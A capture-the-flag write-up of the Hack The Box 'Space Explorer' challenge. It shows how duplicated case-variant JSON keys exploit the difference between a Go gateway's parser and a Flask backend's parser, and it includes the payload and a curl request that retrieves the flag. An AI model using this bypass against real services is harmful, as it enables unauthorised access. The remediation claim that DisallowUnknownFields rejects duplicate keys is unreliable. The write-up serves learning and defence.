# Space Explorer - Challenge Analysis & Security Writeup

**Hack The Box Challenge Link:** [Space Explorer on Hack The Box](https://app.hackthebox.com/challenges/Space%2520Explorer?tab=play_challenge)

---

## Overview
**Space Explorer** is a web security challenge that demonstrates a **Differential JSON Parsing Vulnerability** (JSON Parser Inconsistency) arising in a multi-tier microservice architecture between a Go frontend gateway and a Python (Flask) backend service.

---

## Architecture & Component Flow

The system consists of two separate services running in the same container environment:

```
[ Client / Browser ]
        │  (HTTP POST /execute on Port 8080)
        ▼
[ Go Frontend Service (Gateway) ]
        │  Checks JSON payload for "action"
        │  If "getcosmic" -> Forwards raw request body
        ▼
[ Python Flask Backend Service (Private Port 8081) ]
        │  Executes requested command
        │  If "getSecureCode" -> Returns FLAG
        ▼
[ Response sent back to Client ]
```

---

## Codebase Review

### 1. Gateway Service: `go-app/main.go` (Port 8080)
The Go service acts as the reverse proxy / API gateway:

```go
type RequestData struct {
    Action string `json:"action"`
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
        return
    }

    body, err := io.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read request body", http.StatusBadRequest)
        return
    }

    var requestData RequestData
    if err := json.Unmarshal(body, &requestData); err != nil {
        http.Error(w, "Invalid JSON", http.StatusBadRequest)
        return
    }

    switch requestData.Action {
    case "getcosmic":
        // Vulnerable: Forwards the original unparsed raw body to the backend
        resp, err := http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(body))
        if err != nil {
            http.Error(w, "Scanner offline", http.StatusInternalServerError)
            return
        }
        defer resp.Body.Close()
        io.Copy(w, resp.Body)
    case "getSecureCode":
        w.Write([]byte("Access denied: Invalid security clearance"))
    default:
        http.Error(w, "Invalid command", http.StatusBadRequest)
    }
}
```

### 2. Backend Service: `python-service/app.py` (Port 8081)
The Python Flask service processes the actual command:

```python
@app.route('/execute', methods=['POST'])
def execute():
    if not request.is_json:
        return jsonify({"error": "Invalid transmission format"}), 400

    data = request.get_json()
    
    if 'action' not in data:
        return jsonify({"error": "No command received"}), 400

    if data['action'] == "getcosmic":
        anomaly = random.choice(COSMIC_ANOMALIES)
        return jsonify(anomaly)
    elif data['action'] == "getSecureCode":
        return jsonify({
            "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
            "name": "Captain's Log",
            "src": "https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"
        })
    else:
        return jsonify({"error": "Unknown command"}), 400
```

---

## The Vulnerability: Parser Discrepancy

The vulnerability stems from two conflicting parser behaviors:

1. **Go's `encoding/json` Unmarshaling (Case-Insensitive & Overwrite):**
   - By default, Go maps JSON keys to struct fields using case-folding (case-insensitive).
   - If multiple keys in the JSON match the same struct field (e.g. `"action"` and `"Action"`), the parser accepts them and **the last key in the stream overwrites any earlier ones**.
2. **Python's `json.loads` (Case-Sensitive Dictionary):**
   - Python dictionaries are strictly case-sensitive.
   - `"action"` and `"Action"` are treated as two distinct keys.
   - When Python checks `data['action']`, it only retrieves the value corresponding to the exact lowercase key `"action"`.
3. **Raw Body Forwarding Anti-Pattern:**
   - The Go gateway parses and validates the request using its own internal model, but instead of serializing its validated model, it forwards the client's **raw HTTP body** (`bytes.NewBuffer(body)`) to the backend.

---

## Exploit Analysis

By constructing a JSON payload containing both `"action"` (lowercase) and `"Action"` (capitalized):

```json
{
  "action": "getSecureCode",
  "Action": "getcosmic"
}
```

### Execution Flow:

| Step | Component | Action / Evaluation | Result |
|---|---|---|---|
| **1** | **Go Gateway** | Reads `"action": "getSecureCode"` | `requestData.Action = "getSecureCode"` |
| **2** | **Go Gateway** | Reads `"Action": "getcosmic"` | `requestData.Action` overwritten to `"getcosmic"` |
| **3** | **Go Gateway** | Evaluates `switch requestData.Action` | Matches `"getcosmic"` branch (Validation Bypass) |
| **4** | **Go Gateway** | Forwards original raw JSON to Python backend | Forwarded unchanged |
| **5** | **Python Backend** | Evaluates `data['action']` | Resolves strictly to `"getSecureCode"` |
| **6** | **Python Backend** | Evaluates `elif data['action'] == "getSecureCode"` | Returns secret database record containing the flag |

---

## Reproduction & Verification

### HTTP Request via cURL:
```bash
curl -X POST http://<TARGET_HOST>:<PORT>/execute \
  -H "Content-Type: application/json" \
  -d '{"action": "getSecureCode", "Action": "getcosmic"}'
```

### Expected Server Response:
```json
{
  "flag": "HTB{...}",
  "name": "Captain's Log",
  "src": "https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"
}
```

---

## Remediation & Best Practices

### 1. Re-serialize Validated State (Do NOT forward raw input)
Never forward raw, untrusted user payloads to downstream services after performing validation. Instead, re-serialize the sanitized data structure:

```go
// Safe pattern: Forward re-marshaled data
safePayload, err := json.Marshal(requestData)
if err != nil {
    http.Error(w, "Serialization error", http.StatusInternalServerError)
    return
}
resp, err := http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(safePayload))
```

### 2. Disallow Unknown / Duplicate Fields in Go
Enable strict unmarshaling in Go to reject unexpected keys or ambiguity:

```go
decoder := json.NewDecoder(bytes.NewReader(body))
decoder.DisallowUnknownFields()
if err := decoder.Decode(&requestData); err != nil {
    http.Error(w, "Malformed JSON", http.StatusBadRequest)
    return
}
```

### 3. Implement Strict JSON Schema Validation
Enforce strict schemas across both frontend and backend boundaries to guarantee data model uniformity across services.
